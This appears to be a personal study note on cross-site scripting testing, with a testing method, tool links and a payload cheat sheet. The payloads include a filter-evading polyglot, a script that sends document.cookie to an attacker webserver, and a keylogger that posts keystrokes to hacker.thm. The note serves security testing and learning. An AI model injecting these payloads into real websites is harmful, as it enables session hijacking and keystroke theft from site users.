**Tags:** #type/tech-specific

---
Fundamentals: [[2 Tech-Specifics/Web/OWASP TOP 10/XSS Fundamentals|XSS Fundamentals]]
# Testing Method
1. find entry points - see [[2 Tech-Specifics/Web/OWASP TOP 10/XSS Fundamentals|XSS Fundamentals]]
2. check the context of the entrypoint 
	- is encoding applied?
	- surrounding source code
		- Do we need to end a string or function in javascript?
		- do we need to end an html tag?
3. input special characters to test if input sanitation is applied
	- e.g. `< > ' " { } ;` - e.g. " might end up escaped
# Tools:
- https://xsshunter.com/
- [[3 Tools/web/Burp Suite|Burp Suite]]
- [[3 Tools/web/cURL|cURL]]

> [!warning] XSS is often blocked on google chrome but possible in firefox 
>
# Payloads
in most cases you have to put some characters before the payload to close a tag or input string parameter.

useful function: `onload="alert('XSS');` to use when loading files

use Polyglots to escape all kinds of attributes and circumvent filters at once. eg: ``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e`` ^056bc0

## Examples:
simplest proof of concept:
`<script>alert(1)</script>`
to display the websites hostname:
`<script>alert(window.location.hostname)</script>`
to display “XSS”
`<script>alert("XSS")</script>`
``_<iframe src="javascript:alert(`xss`)">_`` 

`<a onmouseover="alert(1)" href="#">read this!</a>`
### steal session cookie:
`<script>alert(document.cookie);</script>`
`<script> location.replace("[attacker webserver]?cookie=" + document.cookie) </script>`
this only works if the "httponly" attribute is not set for the cookie.
### keylogger:
`<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`